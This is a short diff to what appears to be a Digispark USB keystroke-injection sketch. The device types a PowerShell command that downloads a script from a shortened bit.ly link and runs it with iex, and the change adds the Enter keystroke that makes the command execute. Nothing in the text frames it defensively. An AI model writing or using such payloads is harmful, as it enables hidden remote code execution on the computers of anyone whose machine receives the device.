@@ -14,6 +14,7 @@ void loop(){
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(200);
   DigiKeyboard.print("iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
   for(;;){ /*empty*/ }
 
